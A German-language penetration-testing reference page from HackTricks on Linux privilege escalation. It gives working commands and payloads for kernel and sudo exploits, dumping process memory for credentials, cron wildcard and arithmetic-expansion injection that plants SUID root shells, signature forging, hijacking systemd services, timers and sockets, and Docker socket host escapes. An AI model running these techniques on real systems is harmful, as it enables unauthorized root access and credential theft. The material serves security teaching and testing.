# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Beginnen wir damit, Informationen über das laufende Betriebssystem zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du **Schreibrechte für irgendeinen Ordner innerhalb der `PATH`-Variable** hast, kannst du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Env-Info

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die kernel-Version und ob es einen exploit gibt, der verwendet werden kann, um escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **kompilierte Exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **kompilierte Exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Webseite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (auf dem Victim ausführen, prüft nur exploits für Kernel 2.x)

Suche immer **die Kernel-Version bei Google**, vielleicht steht deine Kernel-Version in einem kernel exploit und dann bist du sicher, dass dieser exploit gültig ist.

Zusätzliche kernel exploitation Techniken:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo Version

Anhand der verwundbaren sudo-Versionen, die in erscheinen:
```bash
searchsploit sudo
```
Sie können prüfen, ob die sudo-Version verwundbar ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben nicht-privilegierten lokalen Benutzern, ihre Privilegien auf root zu eskalieren über die sudo `--chroot`-Option, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) zum Ausnutzen dieser [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Bevor du den Exploit ausführst, stelle sicher, dass deine `sudo`-Version verwundbar ist und die `chroot`-Funktion unterstützt.

Für weitere Informationen siehe die ursprüngliche [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturüberprüfung fehlgeschlagen

Siehe **smasher2 box of HTB** für ein **Beispiel**, wie diese vuln ausgenutzt werden könnte.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere System enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Prüfe **was gemountet und was nicht gemountet ist**, wo und warum. Wenn etwas nicht gemountet ist, könntest du versuchen, es zu mounten und nach privaten Informationen zu suchen
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **ein Compiler installiert ist**. Das ist nützlich, falls du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfen Sie die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine ältere Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, kannst du auch **openVAS** verwenden, um nach veralteter oder verwundbarer Software auf der Maschine zu prüfen.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sein werden. Daher wird die Verwendung von Anwendungen wie OpenVAS oder ähnlichen empfohlen, die prüfen, ob eine installierte Softwareversion gegenüber bekannten Exploits verwundbar ist_

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat, als er haben sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Prozessüberwachung

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Prozessspeicher

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; sie zeigt auch die **Berechtigungen jedes gemappten Bereichs**. Die Pseudo-Datei **mem** **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und ihre Offsets. Diese Informationen nutzen wir, um in die **mem**-Datei zu seeken und alle lesbaren Bereiche in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` gewährt Zugriff auf den **physikalischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann mit /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine für Linux neu interpretierte Version des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Zum Dumpen des Prozessspeichers können Sie verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die root-Anforderungen entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Anmeldeinformationen aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst dump the process (siehe vorherige Abschnitte, um verschiedene Wege zu finden, die memory eines process zu dumpen) und nach credentials im memory suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) stiehlt **Klartext-Zugangsdaten aus dem Speicher** und aus einigen **bekannten Dateien**. Es benötigt root-Rechte, damit es richtig funktioniert.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP-Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – webbasierter Scheduler privesc

Wenn ein Web “Crontab UI” Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du trotzdem über SSH local port-forwarding darauf zugreifen und einen privilegierten Job erstellen, um eine Privilegieneskalation durchzuführen.

Typische Kette
- Loopback-only Port entdecken (z. B. 127.0.0.1:8000) und Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000` ermitteln
- Finde Zugangsdaten in operativen Artefakten:
- Backups/Skripte mit `zip -P <password>`
- systemd unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` offenlegt
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv job und führe ihn sofort aus (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Benutze es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Führe Crontab UI nicht als root aus; beschränke es auf einen dedizierten Benutzer und minimale Berechtigungen
- Binde an localhost und schränke zusätzlich den Zugriff über firewall/VPN ein; verwende Passwörter nicht mehrfach
- Vermeide das Einbetten von secrets in unit files; benutze secret stores oder eine nur für root zugängliche EnvironmentFile
- Aktiviere audit/logging für on-demand job executions



Prüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ein Skript ausnutzen, das von root ausgeführt wird (wildcard vuln? kannst du Dateien modifizieren, die root verwendet? symlinks verwenden? bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in diesem crontab der root user versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\  
Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem script, das ein wildcard verwendet (Wildcard Injection)

Wenn ein script, das als root ausgeführt wird, ein “**\***” in einem Befehl enthält, kann man dies ausnutzen, um unerwartete Dinge zu bewirken (wie privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das Wildcard einem Pfad wie** _**/some/path/\***_ **vorausgeht, ist es nicht verwundbar (sogar** _**./\***_ **ist es nicht).**

Lies die folgende Seite für mehr wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser untrusted Log-Felder liest und diese in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root läuft.

- Warum das funktioniert: In Bash erfolgen expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird also zuerst substituiert (der Befehl läuft), dann wird die verbleibende Zahl `0` für die arithmetische Auswertung verwendet, sodass das Script ohne Fehler weiterläuft.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Sorge dafür, dass vom Angreifer kontrollierter Text in das geparste Log geschrieben wird, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite es um), damit die arithmetische Auswertung gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Wenn du **ein cron script ändern kannst**, das als root ausgeführt wird, kannst du sehr einfach eine shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **directory, auf das du vollen Zugriff hast**, verwendet, kann es nützlich sein, diesen Ordner zu löschen und **einen symlink folder zu einem anderen zu erstellen**, der ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signierte cron-Binaries mit beschreibbaren payloads
Blue teams "signieren" manchmal cron-getriebene Binaries, indem sie eine benutzerdefinierte ELF-Section dumpen und nach einem Vendor-String greppen, bevor sie sie als root ausführen. Wenn dieses Binary group-writable ist (z. B. `/opt/AV/periodic-checks/monitor` im Besitz von `root:devs 770`) und du das signing-Material leakst, kannst du die Section fälschen und die cron-Aufgabe hijacken:

1. Verwende `pspy`, um den Verifizierungsablauf zu erfassen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` aus, gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` und führte dann die Datei aus.
2. Erstelle das erwartete Zertifikat neu mit dem leaked key/config (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Baue einen bösartigen Ersatz (z. B. eine SUID bash ablegen, deinen SSH-Key hinzufügen) und bette das Zertifikat in `.text_sig` ein, sodass der grep besteht:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und erhalte dabei die Execute-Bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Lauf; sobald die naive Signaturprüfung besteht, läuft dein payload als root.

### Frequent cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden Prozess, der startet).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar** (ohne newline-Zeichen) setzt, und der cron job wird funktionieren. Beispiel (beachte das carriage return-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Schreibbare _.service_ Dateien

Prüfe, ob du irgendeine `.service` Datei schreiben kannst, wenn ja, **kannst du sie ändern**, sodass sie **deinen backdoor ausführt, wenn** der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (möglicherweise musst du warten, bis die Maschine neu gestartet wird).\
Zum Beispiel erstelle deine backdoor innerhalb der .service Datei mit **`ExecStart=/tmp/script.sh`**

### Schreibbare Service-Binärdateien

Beachte, dass wenn du **Schreibrechte auf Binärdateien hast, die von Services ausgeführt werden**, du diese ändern kannst, um backdoors einzubauen, sodass beim erneuten Ausführen der Services die backdoors ausgeführt werden.

### systemd PATH - Relative Paths

Du kannst den von **systemd** verwendeten PATH mit:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **escalate privileges**. Du musst nach **relativen Pfaden, die in Service-Konfigurationsdateien verwendet werden** suchen, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstelle eine **ausführbare Datei** mit **dem selben Namen wie das Binary des relativen Pfads** im systemd-PATH-Ordner, in den du schreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird dein **backdoor wird ausgeführt** (unprivilegierte Benutzer können normalerweise keine Services starten/stoppen, prüfe aber, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Services mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Events steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für kalenderbasierte Zeitereignisse und monotonische Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer modifizieren kannst, kannst du ihn dazu bringen, vorhandene systemd.unit-Einheiten auszuführen (wie eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
In der Dokumentation kann man nachlesen, was die Unit ist:

> Die Unit, die aktiviert werden soll, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, ist dieser Wert standardmäßig ein .service, der denselben Namen wie die Timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der Timer-Unit identisch benannt sind, außer beim Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen:

- Finde irgendeine systemd Unit (wie eine `.service`), die ein **beschreibbares Binary ausführt**
- Finde irgendeine systemd Unit, die einen **relativen Pfad ausführt** und über die du **Schreibrechte** auf den **systemd PATH** hast (um das ausführbare Programm zu imitieren)

**Erfahre mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, der **timer** wird **aktiviert**, indem ein Symlink dafür unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` erstellt wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf demselben oder auf verschiedenen Rechnern innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Descriptor-Dateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Mehr über sockets erfahren mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammengefasst werden sie verwendet, um **anzuzeigen, wo zugehört wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, auf die gehört wird, etc.).
- `Accept`: Nimmt ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz erzeugt** und nur das Verbindungs-Socket wird an diese weitergegeben. Wenn **false**, werden alle Listening-Sockets selbst **an die gestartete Service-Unit übergeben**, und es wird nur eine Service-Unit für alle Verbindungen erzeugt. Dieser Wert wird bei Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Unit bedingungslos allen eingehenden Traffic verarbeitet. **Defaults to false**. Aus Leistungsgründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die jeweils **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **service**-Unit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für sockets mit `Accept=no` erlaubt. Sie ist standardmäßig der Service-Unit-Name, der denselben Namen wie das Socket trägt (mit ersetzter Suffix). In den meisten Fällen ist es nicht notwendig, diese Option zu verwenden.

### Schreibbare .socket files

Wenn du eine **schreibbare** `.socket`-Datei findest, kannst du am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die Backdoor wird ausgeführt, bevor das Socket erstellt wird. Daher musst du **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Beschreibbare sockets

Wenn du ein **schreibbares socket** identifizierst (_jetzt sprechen wir von Unix Sockets und nicht von den Konfigurations-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Verwundbarkeit ausnutzen.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation-Beispiel:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es einige **sockets gibt, die auf HTTP-Anfragen lauschen** (_ich spreche nicht von .socket-Dateien, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der socket **auf eine HTTP-Anfrage antwortet**, dann kannst du **mit ihm kommunizieren** und möglicherweise **exploit some vulnerability**.

### Beschreibbarer Docker Socket

Der Docker socket, oft zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den Benutzer `root` und Mitglieder der `docker`-Gruppe beschreibbar. Schreibzugriff auf diesen socket kann zu privilege escalation führen. Hier eine Aufschlüsselung, wie das durchgeführt werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation mit Docker CLI**

Wenn du Schreibzugriff auf den Docker socket hast, kannst du privilege escalation durchführen, indem du die folgenden Befehle ausführst:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen das Starten eines Containers mit root-Zugriff auf das Dateisystem des Hosts.

#### **Direkte Nutzung der Docker API**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Die Liste der verfügbaren Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

